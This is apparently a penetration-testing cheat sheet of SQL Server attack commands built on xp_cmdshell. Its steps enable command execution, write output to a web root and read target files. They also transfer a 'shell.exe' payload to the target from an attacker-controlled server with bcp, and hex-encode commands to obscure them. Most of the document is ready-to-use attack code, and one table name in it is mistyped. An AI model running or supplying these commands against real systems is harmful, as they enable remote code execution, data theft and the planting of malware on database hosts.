# Exploiting xp_cmdshell 
If connected with 'sa user'
```sql
EXEC master..xp_cmdshell '<command>'

# eg. ''<command>'' could be 'ping 1.1.1.1' 
# or 'dir <target directory>'
```

## Saving output of command to a web accessible folder
```sql
EXEC master..xp_cmdshell 'dir c:\ > C:\inetpub\wwwroot\site\dir.txt'--
```

## Read file and put contents into table
```sql

CREATE TABLE filecontent(line varchar(8000));
BULK INSERT filecontent FROM '<target file>';
/* Remember to drop table after extracting it;
DROP TABLE filecontent;
*/
```


# Enable xp_cmdshell
as this is not enabled by default, to enable it issue:
```sql
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;
```

# Disable xp_cmdshell
After done with tests
```sql
EXEC sp_configure 'xp_cmdshell', 0;
EXEC sp_configure 'show advanced options', 0;
RECONFIGURE;
```



# MSSQL upload file

1. Insert file into table 
```
CREATE TABLE HelperTable (file text)
BULK INSERT HelperTable FROM 'shell.exe' WITH (codepage='RAW')
```

2. Force target DB to retrieve it from our server
```
EXEC xp_cmdshell 'bcp "SELECT * FROM HelperTable" queryout shell.exe -c -Craw -S<our server address> -U<our server username> -P<our server password>'
```



# Dumping
1. Create TEMP table

```sql
create table temptable (id int not null identity (1,1), output nvarchar(4096) null);--
```

2. Craft argument `dir c:\`
translate to HEX
```
64 is HEX for "d"
69 is HEX for "i"
72 is HEX for "r"
20 is HEX for " "
63 is HEX for "c"
3a is HEX for ":"
5c is HEX for "\"
```
Insert double zero after every character 

`0x640069007200200063003a005c00`

3. Pass to xp_cmdshell

```sql
declare @t nvarchar(4096) set @t=0x640069007200200063003a005c00 insert into template (output) EXEC master.dbo.xp_cmdshell @t;

```

Now we can use the data dumping techniques to dump this temp table

4. cleanup

```sql
DROP TABLE temptable;
```